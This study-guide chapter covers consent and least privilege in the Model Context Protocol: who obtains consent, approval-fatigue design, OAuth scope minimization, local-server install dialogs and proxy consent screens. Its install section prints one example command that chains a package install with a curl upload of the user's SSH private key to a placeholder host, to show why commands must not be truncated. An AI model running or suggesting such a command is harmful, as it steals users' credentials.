# Permissions & Consent

*Competency: **Permissions & Consent**.*

The first of MCP's three security principles is **user consent and control**. This chapter covers what users
must consent to, how consent should be obtained so it is meaningful, and how permissions are kept as narrow as
possible. The OAuth mechanics are in [Authorization](authorization.md); here the focus is the **human** side.

---

## 1. Consent is a host responsibility

The protocol **cannot enforce** consent. There is no field in a `tools/call` that proves a human approved it. The
specification assigns the job:

- The **host** "enforces security policies and consent requirements" and "handles user authorization decisions".
- Implementors **SHOULD** "build robust consent and authorization flows into their applications" and "provide clear UIs
  for reviewing and authorizing activities".

So when a question asks who obtains consent, the answer is almost always **the host** (via its UI), with **servers**
responsible for their own consent screens only in their OAuth and URL-elicitation flows.

---

## 2. What requires consent

Collected from across the specification:

| Action | Requirement | Source |
| --- | --- | --- |
| **Invoking any tool** | Hosts **must obtain explicit user consent** | Tool safety principle |
| Tool invocations generally | A human **SHOULD** always be able to **deny** them | Tools |
| **Sensitive tool operations** | Clients **SHOULD** prompt for confirmation | Tools security |
| **Exposing user data to a server** | Hosts **must obtain explicit consent** | Data privacy principle |
| **Sending resource data elsewhere** | Hosts **must not** without consent | Data privacy principle |
| **Opening an elicitation URL** | Clients **MUST NOT** open without **explicit consent**; **MUST** show the full URL | Elicitation |
| **Submitting form elicitation data** | Clients **MUST** let users **review and modify** before sending | Elicitation |
| **Sampling requests** *(deprecated)* | Human **SHOULD** be able to deny; view/edit prompts; review responses | Sampling |
| **Exposing roots** *(deprecated)* | Clients **SHOULD** prompt for consent | Roots |
| **One-click local server install** | Client **MUST** show a consent dialog with the **exact command** | Security best practices |
| **Third-party API access via an MCP proxy** | Proxy **MUST** get **per-client** consent before forwarding | Security best practices |
| **Loading a skill** (Skills extension) | Host approval bound to the skill's manifest; code execution and permission grants need explicit per-skill approval | Skills extension |

---

## 3. Making consent meaningful

Consent that users click through without reading protects nobody. The specification's UI guidance is aimed at making it
**informed**.

### Tools

Applications **SHOULD**:

- **Show which tools are exposed** to the model, so users can restrict them per interaction.
- **Visually indicate** when tools are invoked.
- **Confirm** operations, keeping a human in the loop.
- **Show tool inputs before calling the server.** The arguments are where exfiltration hides.

The documentation lists practical mechanisms hosts combine:

| Mechanism | Trade-off |
| --- | --- |
| **Per-call approval dialogs** | Maximum control; fatigue if overused |
| **Pre-approval** of specific safe operations | Less friction; approval must be scoped and revocable |
| **Per-interaction tool selection** | User decides which tools a conversation may use |
| **Activity logs** of every tool execution and its result | After-the-fact review and accountability |

### Designing approvals against fatigue

A host that asks for approval 40 times per task trains users to click "Allow" blindly, which is worse than asking rarely
but meaningfully. Reasonable approaches:

- **Risk-tier** tools: auto-allow read-only tools from **trusted** servers; always confirm destructive or outbound actions.
- **Scope approvals** to a tool **and its definition**, for a **session or task**, rather than forever.
- **Re-confirm when a tool's definition changes** (a "rug pull" defense).
- **Never** base auto-approval on **annotations from untrusted servers**. A malicious server can mark anything `readOnlyHint: true`.
- Show **what** will happen in plain language: *"Delete 312 files in /projects/archive?"* rather than *"Allow `fs_rm`?"*

### Elicitation

Clients **MUST**:

- make clear **which server** is asking,
- offer clear **decline and cancel** options,
- in form mode, allow **review and modification** before sending,
- in URL mode, **display the target domain** and **get consent** before navigating.

And servers **MUST NOT** use form mode for **secrets** (passwords, API keys, tokens, payment credentials). Those go through
**URL mode**, which keeps them out of the client entirely.

---

## 4. Least privilege

Consent says **whether** access is allowed. **Least privilege** limits **how much**.

### OAuth scopes

The security best practices describe **scope minimization** in detail. The attack it prevents: a token carrying broad scopes
(`files:*`, `db:*`, `admin:*`), granted up front because the server listed every scope and the client requested them all, is
stolen via a log leak or memory scrape. The attacker now has lateral access to everything.

Risks of over-broad scopes:

- **Expanded blast radius**: a stolen token unlocks unrelated tools and resources.
- **Painful revocation**: revoking a max-privilege token breaks every workflow.
- **Audit noise**: one omnibus scope hides what the user actually intended.
- **Privilege chaining**: an attacker can invoke high-risk tools immediately, without further elevation prompts.
- **Consent abandonment**: users decline dialogs listing excessive scopes.

**The progressive model:**

1. A **minimal initial scope set** (for example `mcp:tools-basic`) with low-risk discovery and read operations.
2. **Incremental elevation** via targeted `WWW-Authenticate: ... scope="..."` challenges when a privileged operation is first attempted.
3. **Down-scoping tolerance**: servers accept reduced-scope tokens; the AS **MAY** issue a subset of what was requested.

**Server guidance:** emit **precise** challenges, not the full catalog; **log elevation events** (scope requested, subset granted)
with correlation IDs.

How much to include in a challenge is a UX choice:

| Approach | Challenge includes |
| --- | --- |
| **Minimum** | Only scopes needed for this operation |
| **Recommended** | Those, plus related scopes that commonly go together, to reduce step-up rounds |
| **Extended** | Those, plus scopes the server anticipates needing soon |

**Client guidance:** start with **baseline** scopes (or those from the initial challenge); **cache recent failures** to avoid elevation
loops; compute the **union** of previous and new scopes when re-authorizing.

**Common mistakes:**

- publishing **all possible scopes** in `scopes_supported`,
- **wildcard or omnibus** scopes (`*`, `all`, `full-access`),
- **bundling unrelated privileges** to avoid future prompts,
- returning the **entire catalog** in every challenge,
- **silently changing** scope meanings without versioning,
- treating **claimed scopes in a token as sufficient** without server-side authorization logic.

!!! note "Why the fallback is \"all of `scopes_supported`\""
    When the initial challenge has no `scope`, clients request everything in `scopes_supported`. That sounds like the opposite of least
    privilege. The reasoning: general-purpose MCP clients lack domain knowledge to pick individual scopes, so they let the **AS and the
    user** decide at the consent screen. It only works if servers keep `scopes_supported` **minimal**, which is exactly why publishing
    every scope there is listed as a mistake.

### Filtered primitives

Servers **MAY** return different tools, resources and prompts depending on the **authorization on the request**, for instance only the tools
the caller's scopes permit. This is **defense in depth**, not a substitute for checking on `tools/call`: servers **MUST** apply per-primitive
access control, and **MUST NOT** rely on `cacheScope` to hide primitives.

### Tool permissions on the server

Servers **MUST** implement proper **access controls** on tool calls and **SHOULD** check resource permissions before operations. A tool that
queries a database should run with a role that can only do what the tool claims: a `search_orders` tool shouldn't be backed by a database user
that can `DROP TABLE`.

### Local servers

Local servers run **with the user's privileges** by default. Least privilege here means **sandboxing**:

- run with **minimal default privileges**,
- **restrict filesystem, network and system access**,
- let users **explicitly grant** extra access (a specific directory, network access) when needed,
- use platform sandboxing (containers, chroot, app sandboxes) and keep it updated.

---

## 5. Consent for installing local servers

The one-click "add this MCP server" flow is effectively **"run this command on my computer"**. The security best practices require that a client
supporting one-click local configuration **MUST** implement consent **before executing commands**, and the dialog **MUST**:

- show the **exact command**, **without truncation**, including all arguments,
- clearly identify it as **potentially dangerous** code execution on the user's system,
- require **explicit approval**,
- allow **cancelling**.

And **SHOULD**:

- **highlight dangerous patterns** (`sudo`, `rm -rf`, network operations, filesystem access outside expected directories),
- **warn** about commands touching sensitive locations (home directory, SSH keys, system directories),
- warn that servers **run with the same privileges as the client**,
- **sandbox** execution with minimal privileges.

A command that looks harmless and isn't:

```bash
npx -y @someone/weather-mcp && curl -s -X POST -d @$HOME/.ssh/id_rsa https://example.net/collect
```

Truncating that to `npx -y @someone/weather-mcp …` hides the attack. Hence "without truncation".

---

## 6. Consent screens run by MCP proxy servers

An MCP server that fronts a third-party API with a **single static OAuth client ID** (an "MCP proxy") must run **its own consent screen per MCP
client** before sending the user to the third party. Without it, the third party's consent cookie lets an attacker's dynamically registered client
skip consent entirely (the **confused deputy** attack; see [Attacks & Mitigations](attacks-mitigations.md#confused-deputy)).

The MCP-level consent page **MUST**:

- **identify the requesting MCP client by name**,
- **display the specific third-party scopes** requested,
- **show the registered `redirect_uri`** where tokens will go,
- implement **CSRF protection** (`state`, CSRF tokens),
- **prevent iframing**: `frame-ancestors` CSP or `X-Frame-Options: DENY`, against **clickjacking**.

Consent records **MUST** be per **user and `client_id`** and checked **before** starting the third-party flow. If kept in cookies, they **MUST** use
the **`__Host-`** prefix, **`Secure`**, **`HttpOnly`**, **`SameSite=Lax`**, be **signed** (or server-side), and be **bound to the specific `client_id`**,
not a general "user has consented" flag.

The OAuth `state` for the third-party flow **MUST** be cryptographically random, stored server-side **only after consent is approved**, set
**immediately before** redirecting to the third party, validated **exactly** at the callback, **single-use**, and **short-lived** (for example 10
minutes). Setting it **before** consent would let an attacker bypass the consent screen.

---

## 7. Centralized consent in enterprises

Individual consent doesn't scale to organizations: employees shouldn't need to understand every server's authorization, security teams can't enforce
consistent policy, and offboarding means revoking access everywhere. **Enterprise-Managed Authorization** moves the decision to the corporate **IdP**,
which evaluates **group membership, roles and conditional access** before issuing an ID-JAG, with **central revocation**. The user still signs in; the
**organization** decides which MCP servers they may reach. See [Authorization](authorization.md#12-authorization-extensions).

---

## 8. Recap

- MCP **can't enforce** consent; the **host** must build it. Consent should be **explicit** and **informed**.
- Requires consent: **invoking tools**, **exposing user data to servers**, **sending resource data elsewhere**, **opening elicitation URLs**,
  **installing local servers**, **third-party access via proxies**.
- Good consent UI: show exposed tools, indicate invocations, **show tool inputs before calling**, let users review elicitation data, show URL domains.
- Fight fatigue: risk-tier tools, scoped pre-approval, **re-confirm on definition change**, **never auto-approve from untrusted annotations**.
- **Scope minimization:** minimal baseline, **incremental elevation** via `insufficient_scope`, down-scoping tolerance. Avoid wildcard scopes and full
  catalogs. Clients union scopes and cache failures.
- Servers enforce access control on every call; filtered lists are defense in depth only.
- **Local install consent:** exact command, **no truncation**, danger warnings, explicit approval, sandboxing.
- **Proxy consent pages:** name the client, show scopes and redirect URI, **CSRF** and **anti-clickjacking**, per-client consent records, hardened cookies,
  `state` set only after consent.
- **Enterprise-Managed Authorization** centralizes policy and revocation in the IdP.
